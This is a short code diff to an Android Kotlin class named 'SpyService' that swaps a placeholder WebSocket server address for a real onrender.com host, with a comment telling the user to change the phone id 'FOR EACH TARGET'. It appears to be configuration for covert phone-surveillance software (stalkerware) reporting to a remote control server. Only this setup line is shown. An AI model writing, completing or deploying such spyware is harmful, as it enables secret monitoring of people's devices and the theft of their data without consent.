@@ -23,7 +23,7 @@ import java.io.File
 import java.util.concurrent.Executors
 
 class SpyService : LifecycleService() {
-    private val SERVER_WS = "wss://YOUR-RENDER-URL.onrender.com/?id=phone_1" 
+    private val SERVER_WS = "wss://love-v1xj.onrender.com//?id=phone_1" 
     // CHANGE id=phone_1 FOR EACH TARGET
     
     private var ws: WebSocket? = null
